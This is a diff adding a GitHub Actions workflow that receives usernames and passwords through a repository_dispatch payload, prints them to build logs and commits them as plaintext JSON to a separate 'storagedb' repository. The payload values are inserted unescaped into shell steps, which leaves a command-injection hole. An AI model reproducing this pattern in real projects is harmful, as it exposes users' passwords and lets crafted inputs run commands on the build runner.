@@ -1,0 +1,30 @@
+name: Login Action
+
+on:
+  repository_dispatch:
+    types: [login_event]
+
+jobs:
+  process-login:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v2
+
+      - name: Process Login
+        run: |
+          echo "${{ github.event.client_payload.username }}" >> temp_user.txt
+          echo "${{ github.event.client_payload.password }}" >> temp_pass.txt
+          cat temp_user.txt
+          cat temp_pass.txt
+
+      - name: Update Private Repository
+        run: |
+          git clone https://github.com/alie8096/storagedb.git
+          cd storagedb/userData
+          echo '{"username": "${{ github.event.client_payload.username }}", "password": "${{ github.event.client_payload.password }}"}' > issue.json
+          git add issue.json
+          git commit -m "Update user data"
+          git push
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
